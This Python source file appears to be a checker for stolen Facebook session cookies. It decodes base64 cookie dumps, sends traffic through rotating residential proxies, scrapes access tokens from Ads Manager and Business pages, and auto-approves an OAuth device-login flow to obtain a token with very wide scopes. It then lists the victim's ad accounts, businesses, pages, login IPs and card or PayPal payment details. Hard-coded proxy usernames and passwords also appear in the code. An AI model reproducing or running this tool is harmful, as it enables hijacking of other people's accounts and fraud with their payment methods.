# all_payment_methods{

# 	Altpays
# 	payment_method_altpays{
# 		account_id,country,credential_id,display_name,image_url,instrument_type,network_id,payment_provider,title
# 	},

# 	Card
# 	pm_credit_card{
# 		account_id,credential_id,credit_card_address,credit_card_type,display_string,exp_month,exp_year,first_name,is_verified,last_name,middle_name,time_created
# 	},

# 	Soon Remove
# 	non_ads_credit_card{
# 		account_id,credential_id,credit_card_address,credit_card_type,display_string,exp_month,exp_year,first_name,is_verified,last_name,middle_name,subtitle,time_created
# 	},

# 	Banking
# 	payment_method_direct_debits{
# 		account_id,credential_id,credit_card_address,credit_card_type,display_string,exp_month,exp_year,first_name,is_verified,last_name,middle_name,time_created
# 	},

# 	Invoice
# 	payment_method_extended_credits{
# 		account_id,balance,credential_id,max_balance,type,partitioned_from,sequential_liability_amount
# 	},

# 	Paypal
# 	payment_method_paypal{
# 		account_id,credential_id,email_address,time_created
# 	},

# 	Prepaid
# 	payment_method_stored_balances{
# 		account_id,balance,credential_id,total_fundings
# 	},

# 	Ad credits
# 	payment_method_tokens{
# 		account_id,credential_id,current_balance,original_balance,time_created,time_expire,type
# 	}

# }

import traceback
from urllib.parse import unquote
import base64
import json
import random
import re
import requests


class Facebook:
    def __init__(self):
        self.DEFAULT_USERAGENT_DESKTOP = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15'
        self.DEFAULT_USERAGENT_MOBILE = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)'
        self.FACEBOOK_BASE_CORE = 'https://graph.facebook.com'
        self.FACEBOOK_BASE_API = 'https://graph.facebook.com/v14.0'
        self.FACEBOOK_BASE_MBASIC = 'https://mbasic.facebook.com'
        self.FACEBOOK_BASE_D = 'https://d.facebook.com'
        self.FACEBOOK_BASE_M = 'https://m.facebook.com'
        self.FACEBOOK_BASE_WWW = 'https://www.facebook.com'
        self.FACEBOOK_BASE_BM = 'https://business.facebook.com'

    def apiCheck(self, cookieEncode):
        try:
            cookie = self.apiDecodeBase64(cookieEncode)

            api = requests.Session()
            api = self.apiSetProxyToSession(api)
            api = self.apiSetCookieToSession(api, cookie)

            fbUID = self.apiGetUidFromCookie(cookie)
            if fbUID is None:
                return None

            EAAI = self.apiGetTokenEAAI(api)
            if EAAI is None:
                return None

            # EAAG = self.apiGetTokenEAAG(api)

            # sessions = self.apiGetSessions(api)
            # me = self.apiGetMe(api, EAAI if EAAG is None else EAAG)
            adaccounts = self.apiGetAdaccountsMapping(api, EAAI, fbUID)
            # businesses = [] if EAAG is None else self.apiGetBusinesses(
            #     api, EAAG)
            # pages = self.apiGetFacebookPages(api, EAAI)

            return {
                'EAAI': EAAI,
                'EAAG': None,
                'sessions': [],
                'me': {
                    'id': fbUID
                },
                'adaccounts': adaccounts,
                'businesses': [],
                'pages': []
            }
        except requests.exceptions.ConnectionError:
            print(traceback.format_exc())
            return self.apiCheck(cookieEncode)
        except:
            print(traceback.format_exc())
            return None

    def apiDecodeBase64(self, encode):
        return base64.b64decode(encode.replace('\r', '').replace('\n', '').encode('utf-8')).decode('utf-8')

    def apiChunks(self, lst, n):
        return [lst[i:i + n] for i in range(0, len(lst), n)]

    def apiParserCookieToDic(self, cookie):
        return {c['name']: c['value'] for c in json.loads(cookie)}

    def apiGetUidFromCookie(self, cookie):
        return self.apiParserCookieToDic(cookie).get('c_user')

    def stringify(self, obj: dict) -> dict:
        """turn every value in the dictionary to a string"""
        for k, v in obj.items():
            if isinstance(v, dict):
                # if value is a dictionary, stringifiy recursively
                self.stringify(v)
                continue
            if not isinstance(v, str):
                if isinstance(v, bool):
                    # False/True -> false/true
                    obj[k] = str(v).lower()
                else:
                    obj[k] = str(v)
        return obj

    def apiSetCookieToSession(self, api: requests.Session, cookie):
        cookie_list = json.loads(cookie)
        print(
            self.stringify(cookie_list[0])
        )
        # cookie_jar = requests.utils.cookiejar_from_dict(
        #     self.stringify(cookie_list[0]))
        # for cookie in cookie_list[1:]:
        #     requests.utils.add_dict_to_cookiejar(
        #         cookie_jar, self.stringify(cookie))
        # api.cookies = cookie_jar

        # api.cookies.update(self.apiParserCookieToDic(cookie))
        return api

    def apiGetHeadersDesktop(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_DESKTOP}

    def apiGetHeadersMobile(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_MOBILE}

    def apiSetProxyToSession(self, api: requests.Session):
        # if random.gauss(0, 0.5) > 0:
        #     session_id = round(random.random()*1000000)
        #     api.proxies.update({
        #         'http': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225',
        #         'https': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225'
        #     })
        # else:
        #     session_id = random.randint(10001, 50000)
        #     api.proxies.update({
        #         'http': f'http://user-pquoctuanno1:Tuan27121998@all.dc.smartproxy.com:{session_id}',
        #         'https': f'http://user-pquoctuanno1:Tuan27121998@all.dc.smartproxy.com:{session_id}'
        #     })

        session_id = round(random.random()*1000000)
        api.proxies.update({
            'http': f'http://lum-customer-hl_ab3d1e44-zone-checker-country-us-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225',
            'https': f'http://lum-customer-hl_ab3d1e44-zone-checker-country-us-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225'
        })
        return api

    def apiGetTokenEAAI(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/ads/manager/account_settings/account_billing',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'access_token:"(.*?)"', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAB(self, api: requests.Session, act):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/adsmanager/manage/campaigns?act={act}',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'__accessToken="(.*?)', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAG(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_BM}/content_management',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'accessToken":"(EAAG.*?)"', res)
            if len(regx) > 0:
                return regx[0]
            else:
                return self.apiGetTokenEAAGAnotherPermission(api)
        except:
            return None

    def apiGetTokenEAAGAnotherPermission(self, api: requests.Session):
        try:
            def getUserCode():
                res = api.post(
                    f'{self.FACEBOOK_BASE_CORE}/v2.6/device/login?access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94&scope=email,public_profile,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login,user_friends,user_posts,user_gender,user_link,user_age_range,read_custom_friendlists,whitelisted_offline_access,publish_video,business_management,publish_to_groups,groups_access_member_info,pages_read_engagement,pages_manage_metadata,pages_read_user_content,pages_manage_ads,pages_manage_posts,pages_manage_engagement,ads_read,attribution_read,catalog_management,gaming_user_locale,instagram_basic,instagram_content_publish,instagram_manage_comments,instagram_manage_insights,leads_retrieval,pages_manage_cta,pages_manage_instant_articles,pages_messaging,pages_show_list,private_computation_access,whatsapp_business_management,whatsapp_business_messaging,manage_fundraisers,instagram_manage_messages,page_events',
                    headers=self.apiGetHeadersDesktop()
                ).json()
                return res['code'], res['user_code']

            def getSecretCode(user_code):
                res = api.get(
                    f'{self.FACEBOOK_BASE_D}/device?user_code={user_code}',
                    headers=self.apiGetHeadersMobile()
                ).text
                regx_fb_dtsg = re.findall(
                    r'<input type="hidden" name="fb_dtsg" value="(.*?)"', res)
                regx_jazoest = re.findall(
                    r'<input type="hidden" name="jazoest" value="(.*?)"', res)
                fb_dtsg = regx_fb_dtsg[0] if len(regx_fb_dtsg) > 0 else None
                jazoest = regx_jazoest[0] if len(regx_jazoest) > 0 else None
                return fb_dtsg, jazoest

            def getRedirect(user_code, fb_dtsg, jazoest):
                res = api.post(
                    f'{self.FACEBOOK_BASE_D}/device/redirect/',
                    data={
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': '0',
                        'user_code': user_code
                    },
                    headers=self.apiGetHeadersMobile()
                ).text
                return res

            def getFormParams(data):
                regxFormParams = re.findall(
                    r'<input (?=[^>]* name=["\']([^\'"]*)|)(?=[^>]* value=["\']([^\'"]*)|)', data)
                formParams = {}
                for (name, value) in regxFormParams:
                    if name != '__CANCEL__':
                        formParams[name] = 'NEXT' if name == '__CONFIRM__' else value
                return formParams

            def getToken(code):
                res = api.post(
                    f'{self.FACEBOOK_BASE_CORE}/v2.6/device/login_status?access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94&code={code}',
                    headers=self.apiGetHeadersDesktop()
                ).json()
                return res.get('access_token')

            code, user_code = getUserCode()
            fb_dtsg, jazoest = getSecretCode(user_code)

            if fb_dtsg is not None and jazoest is not None:
                redirect = getRedirect(user_code, fb_dtsg, jazoest)

                if '/dialog/oauth/read/' in redirect:
                    resRead = api.post(
                        f'{self.FACEBOOK_BASE_D}/v2.0/dialog/oauth/read/',
                        data=getFormParams(redirect)
                    )
                    redirect = resRead.text
                if '/dialog/oauth/write/' in redirect:
                    resWrite = api.post(
                        f'{self.FACEBOOK_BASE_D}/v2.0/dialog/oauth/write/',
                        data=getFormParams(redirect)
                    )
                    redirect = resWrite.text
                if '/dialog/oauth/extended/' in redirect:
                    resExtended = api.post(
                        f'{self.FACEBOOK_BASE_D}/v2.0/dialog/oauth/extended/',
                        data=getFormParams(redirect)
                    )
                    redirect = resExtended.text

                    if resExtended.status_code == 200:
                        return getToken(code)
                if '/dialog/oauth/confirm/' in redirect:
                    resConfirm = api.post(
                        f'{self.FACEBOOK_BASE_D}/v2.0/dialog/oauth/confirm/',
                        data=getFormParams(redirect)
                    )
                    redirect = resConfirm.text

                    if resConfirm.status_code == 200:
                        return getToken(code)
            return None
        except:
            return None

    def apiGetSessions(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_M}/settings/security_login/sessions',
                headers=self.apiGetHeadersMobile()
            ).text
            IP = re.findall(r'__html:"IP: (.*?)"', res)
            return list(dict.fromkeys(IP))
        except:
            return []

    def apiGetMe(self, api: requests.Session, access_token):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_API}/me?fields=id,name,birthday,gender,friends.limit(0),picture.type(large)&access_token={access_token}',
                headers=self.apiGetHeadersDesktop()
            ).json()
            return res
        except:
            return {}

    def apiGetAdaccounts(self, api: requests.Session, access_token, adaccounts=[], next=None):
        try:
            if next is None:
                # default_url = f'{self.FACEBOOK_BASE_API}/me?fields=adaccounts.limit(2500){{account_id,id,name,account_status,currency,balance,amount_spent,adtrust_dsl,adspaymentcycle,owner,users,business,timezone_name,timezone_offset_hours_utc,is_notifications_enabled,disable_reason,ads_volume}}&access_token={access_token}'
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=adaccounts.limit(2500){{account_id,id,name,account_status,currency,balance,amount_spent,adtrust_dsl,adspaymentcycle}}&access_token={access_token}'
                prev_res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return adaccounts
                res = prev_res.json()

                if 'adaccounts' in res:
                    if len(res['adaccounts']['data']) >= 2500:
                        if 'next' in res['adaccounts']['paging']:
                            return self.apiGetAdaccounts(
                                api,
                                access_token,
                                adaccounts + res['adaccounts']['data'],
                                res['adaccounts']['paging']['next']
                            )
                    return res['adaccounts']['data']
                return adaccounts
            else:
                next = unquote(next)
                prev_res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return adaccounts
                res = prev_res.json()

                if 'next' in res['paging']:
                    return self.apiGetAdaccounts(
                        api,
                        access_token,
                        adaccounts + res['data'],
                        res['paging']['next']
                    )
                return adaccounts + res['data']
        except:
            return adaccounts

    def apiGetAdaccountsMapping(self, api: requests.Session, access_token, uid):
        adaccounts_fixed = []

        adaccounts = self.apiGetAdaccounts(api, access_token)
        return adaccounts
        try:
            adaccounts_has_permission = []
            for adaccount in adaccounts:
                me = None
                for e in adaccount['users']['data']:
                    if e['id'] == uid:
                        me = e
                        break
                if me['role'] in [1001, 1002]:
                    adaccounts_has_permission.append(adaccount)

            adaccounts_has_permission_chunks = self.apiChunks(
                adaccounts_has_permission,
                100
            )
            adaccounts_values = {}
            for adaccounts_chunks in adaccounts_has_permission_chunks:
                ids = ','.join(
                    list(map(lambda e: e['id'], adaccounts_chunks)))
                res = api.get(
                    f'{self.FACEBOOK_BASE_API}?ids={ids}&fields=all_payment_methods{{pm_credit_card{{credit_card_address,credit_card_type,display_string,exp_month,exp_year,is_verified,time_created}},payment_method_paypal{{email_address,time_created}},payment_method_stored_balances{{balance,total_fundings,time_created}},payment_method_direct_debits{{display_string,time_created}},payment_method_extended_credits{{balance,max_balance,partitioned_from,sequential_liability_amount,time_created}}}}&access_token={access_token}',
                    headers=self.apiGetHeadersDesktop()
                ).json()
                adaccounts_values = {**adaccounts_values, **res}

            for adaccount in adaccounts:
                adaccounts_fixed.append(
                    {**adaccount, **adaccounts_values[adaccount['id']]}
                )
            return adaccounts_fixed
        except:
            return adaccounts

    def apiGetBusinesses(self, api: requests.Session, access_token, businesses=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=businesses.limit(2500){{id,name,owned_ad_accounts.limit(2500){{id,account_id,name}},business_users.limit(2500){{id,name,role,email,pending_email}},created_time,owned_pixels{{id,name}}}}&access_token={access_token}'
                prev_res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return businesses
                res = prev_res.json()

                if 'businesses' in res:
                    if len(res['businesses']['data']) >= 2500:
                        if 'next' in res['businesses']['paging']:
                            return self.apiGetBusinesses(
                                api,
                                access_token,
                                businesses + res['businesses']['data'],
                                res['businesses']['paging']['next']
                            )
                    return res['businesses']['data']
                return businesses
            else:
                next = unquote(next)
                prev_res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return businesses
                res = prev_res.json()

                if 'next' in res['paging']:
                    return self.apiGetBusinesses(
                        api,
                        access_token,
                        businesses + res['data'],
                        res['paging']['next']
                    )
                return businesses + res['data']
        except:
            return businesses

    def apiGetFacebookPages(self, api: requests.Session, access_token, facebook_pages=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=facebook_pages.limit(2500){{id,page_created_time,followers_count,fan_count}}&access_token={access_token}'
                prev_res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return facebook_pages
                res = prev_res.json()

                if 'facebook_pages' in res:
                    if len(res['facebook_pages']['data']) >= 2500:
                        if 'next' in res['facebook_pages']['paging']:
                            return self.apiGetFacebookPages(
                                api,
                                access_token,
                                facebook_pages + res['facebook_pages']['data'],
                                res['facebook_pages']['paging']['next']
                            )
                    return res['facebook_pages']['data']
                return facebook_pages
            else:
                next = unquote(next)
                prev_res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                )
                if prev_res.status_code != 200:
                    return facebook_pages
                res = prev_res.json()

                if 'next' in res['paging']:
                    return self.apiGetFacebookPages(
                        api,
                        access_token,
                        facebook_pages + res['data'],
                        res['paging']['next']
                    )
                return facebook_pages + res['data']
        except:
            return facebook_pages


facebook = Facebook()
